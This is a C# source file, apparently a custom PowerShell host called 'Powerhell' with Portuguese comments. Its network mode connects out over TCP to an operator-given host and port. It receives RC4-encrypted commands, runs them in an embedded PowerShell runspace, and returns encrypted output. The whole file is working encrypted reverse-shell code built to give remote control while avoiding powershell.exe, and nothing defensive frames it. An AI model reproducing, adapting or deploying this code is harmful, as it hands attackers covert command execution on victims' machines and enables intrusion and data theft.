using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Sockets;
using System.Text;
using System.Linq;
using System.Collections.Generic;   // <-- novo

namespace Powerhell
{
    internal class Program
    {
        private static string encryptionKey = "";

        private static void Main(string[] args)
        {
            string host = null;
            int port = 0;
            bool useNetwork = false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-c" && i + 3 < args.Length)
                {
                    useNetwork = true;
                    host = args[i + 1];
                    port = int.Parse(args[i + 2]);
                    encryptionKey = args[i + 3];
                    break;
                }
            }

            if (useNetwork)
            {
                RunClient(host, port);
            }
            else
            {
                RunLocal();
            }
        }

        private static void RunLocal()
        {
            Console.Title = "Mini PowerShell Host - Local";
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();
                while (true)
                {
                    Console.Write("PS > ");
                    string input = Console.ReadLine();
                    if (string.IsNullOrWhiteSpace(input) || input.ToLower() == "exit") break;
                    Console.WriteLine(ExecuteCommand(runspace, input));
                }
            }
        }

        private static void RunClient(string host, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.NoDelay = true;                   // baixa latência
                    // client.ReceiveTimeout = 30000;       // opcional
                    // client.SendTimeout    = 30000;       // opcional
                    client.Connect(host, port);

                    using (NetworkStream stream = client.GetStream())
                    using (Runspace runspace = RunspaceFactory.CreateRunspace())
                    {
                        runspace.Open();

                        while (true)
                        {
                            /* ========================
                               1) Receber comando
                               ======================== */
                            byte[] encryptedData = ReadFully(stream);
                            if (encryptedData.Length == 0) break; // conexão foi encerrada

                            string command = Encoding.UTF8
                                .GetString(RC4(encryptedData, Encoding.UTF8.GetBytes(encryptionKey)))
                                .Trim('\0', ' ', '\n', '\r');

                            if (string.Equals(command, "exit", StringComparison.OrdinalIgnoreCase))
                                break;

                            /* ========================
                               2) Executar comando
                               ======================== */
                            string result = ExecuteCommand(runspace, command);

                            /* ========================
                               3) Enviar resposta
                               ======================== */
                            byte[] responseBytes     = Encoding.UTF8.GetBytes(result);
                            byte[] encryptedResponse = RC4(responseBytes, Encoding.UTF8.GetBytes(encryptionKey));

                            stream.Write(encryptedResponse, 0, encryptedResponse.Length);
                            stream.Flush();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro na conexão: " + ex.Message);
            }
        }

        /* ============================================================
           NOVO: lê da NetworkStream até não haver mais dados disponíveis
           ============================================================ */
        private static byte[] ReadFully(NetworkStream stream)
        {
            List<byte> data = new List<byte>();
            byte[] buffer   = new byte[8192];

            // Primeiro bloqueante — garante que espera ao menos um pacote
            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            if (bytesRead == 0) return Array.Empty<byte>();

            data.AddRange(buffer.Take(bytesRead));

            // Depois, consome o que já chegou ao SO sem bloquear novamente
            while (stream.DataAvailable)
            {
                bytesRead = stream.Read(buffer, 0, buffer.Length);
                if (bytesRead == 0) break;
                data.AddRange(buffer.Take(bytesRead));
            }

            return data.ToArray();
        }

        private static string ExecuteCommand(Runspace runspace, string commandText)
        {
            StringBuilder output = new StringBuilder();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript(commandText);

                try
                {
                    Collection<PSObject> results = ps.Invoke();
                    foreach (var obj in results)
                        if (obj != null)
                            output.AppendLine(obj.ToString());

                    foreach (var err in ps.Streams.Error)
                        output.AppendLine("Erro: " + err.ToString());
                }
                catch (Exception ex)
                {
                    output.AppendLine("Erro de execução: " + ex.Message);
                }
            }

            return output.Length > 0
                ? output.ToString()
                : "Comando executado (sem retorno).\n";
        }

        /* RC4 inalterado ------------------------------------------------ */
        private static byte[] RC4(byte[] data, byte[] key)
        {
            int[] s = Enumerable.Range(0, 256).ToArray();
            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) % 256;
                (s[i], s[j]) = (s[j], s[i]);
            }

            int x = 0, y = 0;
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) % 256;
                y = (y + s[x]) % 256;
                (s[x], s[y]) = (s[y], s[x]);
                result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) % 256]);
            }
            return result;
        }
    }
}